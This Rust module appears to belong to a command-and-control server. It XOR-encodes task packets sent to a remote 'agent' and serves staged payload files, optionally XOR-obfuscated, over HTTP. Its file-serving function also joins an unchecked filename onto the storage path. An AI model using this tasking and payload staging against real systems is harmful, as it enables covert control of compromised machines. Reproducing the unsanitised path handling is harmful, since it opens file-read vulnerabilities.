//! Module relating to functionality over the wire, such as transformation of data in transit

use axum::{
    body::Body,
    http::{
        HeaderValue, StatusCode,
        header::{CONTENT_DISPOSITION, CONTENT_TYPE},
    },
    response::{IntoResponse, Response},
};
use futures::StreamExt;
use shared::{
    net::{CommandHeader, TasksNetworkStream, XorEncode, encode_u16buf_to_u8buf},
    tasks::{Command, Task},
};
use std::path::PathBuf;
use tokio_util::io::ReaderStream;

use crate::{FILE_STORE_PATH, logging::log_error_async};

/// Serialises pending tasks to be sent over the wire to be consumed by the agent.
///
/// # Returns
/// If the input task is `None`, the function will serialise a Sleep command in the correct
/// format for the agent. Otherwise, it will serialise every task into a valid serde json
/// byte vector, and return that.
pub async fn serialise_tasks_for_agent(tasks: Option<Vec<Task>>) -> Vec<u8> {
    let mut responses: TasksNetworkStream = Vec::new();

    let tasks: Vec<Task> = match tasks {
        Some(tasks) => tasks,
        None => {
            let raw = prepare_response_packet(Task {
                id: 0,
                command: Command::Sleep,
                metadata: None,
            })
            .await
            .xor_network_stream();
            responses.push(raw);
            return serde_json::to_vec(&responses).unwrap();
        }
    };

    for task in tasks {
        let raw = prepare_response_packet(task).await.xor_network_stream();
        responses.push(raw)
    }

    serde_json::to_vec(&responses).unwrap()
}

async fn prepare_response_packet(task: Task) -> Vec<u8> {
    let mut packet: Vec<u16> = Vec::from_command(task.command);

    if task.metadata.is_none() {
        push_task_id_bytes(&mut packet, task.id);
        return encode_u16buf_to_u8buf(&packet);
    }

    // Now encode in the metadata
    let data = task.metadata.unwrap();
    let mut data_bytes: Vec<u16> = data.encode_utf16().collect();

    packet.append(&mut data_bytes);

    push_task_id_bytes(&mut packet, task.id);

    encode_u16buf_to_u8buf(&packet)
}

fn push_task_id_bytes(buf: &mut Vec<u16>, id: i32) {
    let id_bytes = id.to_le_bytes();
    let low = u16::from_le_bytes([id_bytes[0], id_bytes[1]]);
    let high = u16::from_le_bytes([id_bytes[2], id_bytes[3]]);

    buf.push(low);
    buf.push(high);
}

/// Serves a file from the local disk by its file name. The server will look in the
/// ../staged_files/ dir for the relevant file.
pub async fn serve_file(filename: &String, xor_key: Option<u8>) -> Response {
    let mut path = PathBuf::from(FILE_STORE_PATH);
    path.push(filename);

    let file = match tokio::fs::File::open(path).await {
        Ok(f) => f,
        Err(e) => {
            log_error_async(&format!("Failed to read file. {e}")).await;
            return StatusCode::BAD_GATEWAY.into_response();
        }
    };

    let stream = ReaderStream::new(file);

    // Serve XOR'ed bytes if the file was staged as XOR payload
    let body = if let Some(key) = xor_key {
        let xor_stream = stream.map(move |chunk| {
            chunk.map(|bytes| {
                let mut data: Vec<u8> = bytes.to_vec();
                for byte in data.iter_mut() {
                    *byte ^= key;
                }
                axum::body::Bytes::from(data)
            })
        });
        Body::from_stream(xor_stream)
    } else {
        Body::from_stream(stream)
    };

    Response::builder()
        .status(StatusCode::OK)
        .header(
            CONTENT_TYPE,
            HeaderValue::from_static("application/octet-stream"),
        )
        .header(
            CONTENT_DISPOSITION,
            HeaderValue::from_str(&format!("inline; filename=\"{filename}\"")).unwrap(),
        )
        .body(body)
        .unwrap()
}
